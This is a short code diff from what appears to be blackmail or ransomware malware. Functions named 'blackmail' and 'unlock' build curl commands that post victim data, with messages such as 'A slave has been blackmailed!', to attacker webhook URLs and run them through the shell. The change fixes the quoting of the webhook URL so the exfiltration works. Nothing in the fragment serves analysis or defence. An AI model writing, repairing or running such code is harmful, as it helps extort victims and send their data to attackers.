@@ -457,7 +457,7 @@ def blackmail(user: Session):
            ' -X POST --data "{\"content\":' 
            f'\"A slave has been blackmailed! {user.b_data}\"'
            '}"'
-           f'{HOOKB}"')
+           f'"{HOOKB}"')
     run(cmd, shell=True)
     print(f"Sending {user.b_data} to {user.b_data}...")
 
@@ -471,7 +471,7 @@ def unlock(user: Session):
            ' -X POST --data "{\"content\":' 
            f'\"A slave has been given an unlock code! {user.u_data}\"'
            '}"'
-           f'{HOOKU}"')
+           f'"{HOOKU}"')
     run(cmd, shell=True)
     user.state = "closed (unlock)"
 
